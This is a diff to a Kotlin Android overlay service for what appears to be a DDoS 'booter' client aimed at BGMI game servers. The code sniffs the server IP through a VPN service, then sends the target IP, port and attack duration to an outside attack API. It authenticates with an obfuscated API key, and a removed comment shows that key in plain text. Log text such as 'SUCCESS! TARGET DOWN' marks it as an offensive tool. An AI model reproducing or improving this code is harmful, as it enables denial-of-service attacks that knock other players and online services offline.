@@ -10,6 +10,7 @@ import android.os.Looper
 import android.util.Base64
 import android.view.Gravity
 import android.view.LayoutInflater
+import android.view.MotionEvent
 import android.view.View
 import android.view.WindowManager
 import android.widget.*
@@ -21,11 +22,14 @@ import javax.crypto.spec.SecretKeySpec
 class FloatingService : Service() {
     private lateinit var windowManager: WindowManager
     private lateinit var floatingView: View
+    private lateinit var bubbleView: View
+    
     private lateinit var etIp: EditText
     private lateinit var etPort: EditText
     private lateinit var tvTime: TextView
     private lateinit var btnAttack: Button
     private lateinit var btnGetIp: Button
+    private lateinit var tvLog: TextView
     private var selectedTime = 120
 
     companion object {
@@ -39,59 +43,83 @@ class FloatingService : Service() {
                 etIpRef?.setText(ip)
                 etPortRef?.setText(port)
                 btnGetIpRef?.text = "IP CAUGHT ✅"
-                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#00FFCC"))
+                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                 btnGetIpRef?.setTextColor(android.graphics.Color.BLACK)
                 Toast.makeText(instance, "BGMI IP Found!", Toast.LENGTH_SHORT).show()
             }
         }
     }
 
+    private val paramsPanel = WindowManager.LayoutParams(
+        WindowManager.LayoutParams.WRAP_CONTENT,
+        WindowManager.LayoutParams.WRAP_CONTENT,
+        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+        PixelFormat.TRANSLUCENT
+    )
+
+    private val paramsBubble = WindowManager.LayoutParams(
+        WindowManager.LayoutParams.WRAP_CONTENT,
+        WindowManager.LayoutParams.WRAP_CONTENT,
+        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+        PixelFormat.TRANSLUCENT
+    )
+
     override fun onCreate() {
         super.onCreate()
         instance = this
         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
-        
-        val params = WindowManager.LayoutParams(
-            WindowManager.LayoutParams.WRAP_CONTENT,
-            WindowManager.LayoutParams.WRAP_CONTENT,
-            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, 
-            PixelFormat.TRANSLUCENT
-        )
-        params.gravity = Gravity.TOP or Gravity.START
-        params.x = 50
-        params.y = 150
 
+        paramsPanel.gravity = Gravity.TOP or Gravity.START
+        paramsPanel.x = 50
+        paramsPanel.y = 150
         floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)
-        windowManager.addView(floatingView, params)
+
+        paramsBubble.gravity = Gravity.TOP or Gravity.START
+        paramsBubble.x = 50
+        paramsBubble.y = 150
+        bubbleView = LayoutInflater.from(this).inflate(R.layout.floating_bubble, null)
+
+        windowManager.addView(floatingView, paramsPanel)
 
         etIp = floatingView.findViewById(R.id.fEtIp)
         etPort = floatingView.findViewById(R.id.fEtPort)
         tvTime = floatingView.findViewById(R.id.fTvTime)
+        tvLog = floatingView.findViewById(R.id.tvLog)
         btnAttack = floatingView.findViewById(R.id.fBtnAttack)
         btnGetIp = floatingView.findViewById(R.id.fBtnGetIp)
+        val btnVpnOff = floatingView.findViewById<Button>(R.id.fBtnVpnOff)
         val seekBar = floatingView.findViewById<SeekBar>(R.id.fSeekBar)
-        val btnClose = floatingView.findViewById<TextView>(R.id.btnClose)
-
+        
         etIpRef = etIp
         etPortRef = etPort
         btnGetIpRef = btnGetIp
 
-        btnClose.setOnClickListener { stopSelf() }
+        floatingView.findViewById<TextView>(R.id.btnClose).setOnClickListener { stopSelf() }
+        floatingView.findViewById<TextView>(R.id.btnMinimize).setOnClickListener {
+            windowManager.removeView(floatingView)
+            windowManager.addView(bubbleView, paramsBubble)
+        }
+
+        bubbleView.setOnClickListener {
+            windowManager.removeView(bubbleView)
+            windowManager.addView(floatingView, paramsPanel)
+        }
 
         seekBar.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
             override fun onProgressChanged(seekBar: SeekBar?, progress: Int, fromUser: Boolean) {
                 selectedTime = 60 + (progress * 10) 
-                tvTime.text = "PULSE DURATION: ${selectedTime}s"
+                tvTime.text = "DURATION: ${selectedTime}s"
             }
             override fun onStartTrackingTouch(seekBar: SeekBar?) {}
             override fun onStopTrackingTouch(seekBar: SeekBar?) {}
         })
 
         btnGetIp.setOnClickListener {
+            tvLog.text = "> SNIFFING VPN..."
             btnGetIp.text = "SNIFFING..."
             btnGetIp.isEnabled = false
-            
             val intent = VpnService.prepare(this)
             if (intent != null) {
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
@@ -101,16 +129,81 @@ class FloatingService : Service() {
             }
         }
 
+        btnVpnOff.setOnClickListener {
+            stopService(Intent(this, VpnService::class.java))
+            tvLog.text = "> VPN STOPPED"
+            btnGetIp.text = "GET IP"
+            btnGetIp.isEnabled = true
+            btnGetIp.setBackgroundColor(android.graphics.Color.parseColor("#1F2937"))
+            btnGetIp.setTextColor(android.graphics.Color.parseColor("#FBBF24"))
+        }
+
         btnAttack.setOnClickListener {
             val ip = etIp.text.toString().trim()
             val port = etPort.text.toString().trim()
             if (ip.isEmpty() || port.isEmpty()) {
-                Toast.makeText(this, "Enter IP and Port!", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "IP or Port missing!", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
             btnAttack.text = "LAUNCHING..."
             btnAttack.isEnabled = false
+            tvLog.text = "> ATTACK SENT [${selectedTime}s]"
             executeAttack(ip, port, selectedTime)
+        }
+
+        setupDragAndResize()
+    }
+
+    private var initialX = 0
+    private var initialY = 0
+    private var initialTouchX = 0f
+    private var initialTouchY = 0f
+
+    private fun setupDragAndResize() {
+        val header = floatingView.findViewById<LinearLayout>(R.id.headerLayout)
+        header.setOnTouchListener { _, event ->
+            when (event.action) {
+                MotionEvent.ACTION_DOWN -> {
+                    initialX = paramsPanel.x
+                    initialY = paramsPanel.y
+                    initialTouchX = event.rawX
+                    initialTouchY = event.rawY
+                    true
+                }
+                MotionEvent.ACTION_MOVE -> {
+                    paramsPanel.x = initialX + (event.rawX - initialTouchX).toInt()
+                    paramsPanel.y = initialY + (event.rawY - initialTouchY).toInt()
+                    windowManager.updateViewLayout(floatingView, paramsPanel)
+                    true
+                }
+                else -> false
+            }
+        }
+
+        val resizeHandle = floatingView.findViewById<ImageView>(R.id.resizeHandle)
+        var initialWidth = 0
+        var initialHeight = 0
+        resizeHandle.setOnTouchListener { _, event ->
+            when (event.action) {
+                MotionEvent.ACTION_DOWN -> {
+                    initialWidth = floatingView.width
+                    initialHeight = floatingView.height
+                    initialTouchX = event.rawX
+                    initialTouchY = event.rawY
+                    true
+                }
+                MotionEvent.ACTION_MOVE -> {
+                    val newWidth = initialWidth + (event.rawX - initialTouchX).toInt()
+                    val newHeight = initialHeight + (event.rawY - initialTouchY).toInt()
+                    
+                    paramsPanel.width = if (newWidth > 300) newWidth else 300
+                    paramsPanel.height = if (newHeight > 200) newHeight else WindowManager.LayoutParams.WRAP_CONTENT
+                    
+                    windowManager.updateViewLayout(floatingView, paramsPanel)
+                    true
+                }
+                else -> false
+            }
         }
     }
 
@@ -118,8 +211,6 @@ class FloatingService : Service() {
         Thread {
             try {
                 val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
-                
-                // TERA ENCRYPTED API KEY (Decrypts to sp_live_065a318078f3efc19e0be720102e9a7e)
                 val encryptedKey = "dDNad1gyeHBkbVZmTURZMVlUTXhPREEzT0dZelpXWmpNVGxsTUdKbE56SXdNVEF5WlRsaE4yVT0="
                 val apiKey = decryptData(encryptedKey)
 
@@ -135,18 +226,20 @@ class FloatingService : Service() {
 
                 Handler(Looper.getMainLooper()).post {
                     if (conn.responseCode in 200..201) {
-                        btnAttack.text = "ATTACK FIRED ✅"
-                        btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#00FFCC"))
-                        btnAttack.setTextColor(android.graphics.Color.BLACK)
+                        btnAttack.text = "LAUNCHED ✅"
+                        btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
+                        tvLog.text = "> SUCCESS! TARGET DOWN"
                     } else {
-                        btnAttack.text = "FAILED ❌"
+                        btnAttack.text = "LAUNCH 🚀"
                         btnAttack.isEnabled = true
+                        tvLog.text = "> ERROR: ${conn.responseCode}"
                     }
                 }
             } catch (e: Exception) {
                 Handler(Looper.getMainLooper()).post {
-                    btnAttack.text = "ERROR ❌"
+                    btnAttack.text = "LAUNCH 🚀"
                     btnAttack.isEnabled = true
+                    tvLog.text = "> NETWORK FAIL"
                 }
             }
         }.start()
@@ -159,16 +252,15 @@ class FloatingService : Service() {
             val keySpec = SecretKeySpec(secretKey.toByteArray(), "AES")
             cipher.init(Cipher.DECRYPT_MODE, keySpec)
             String(cipher.doFinal(Base64.decode(encryptedData, Base64.DEFAULT)))
-        } catch (e: Exception) {
-            ""
-        }
+        } catch (e: Exception) { "" }
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        if (::floatingView.isInitialized) {
-            windowManager.removeView(floatingView)
-        }
+        try {
+            if (::floatingView.isInitialized) windowManager.removeView(floatingView)
+            if (::bubbleView.isInitialized) windowManager.removeView(bubbleView)
+        } catch (e: Exception) {}
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
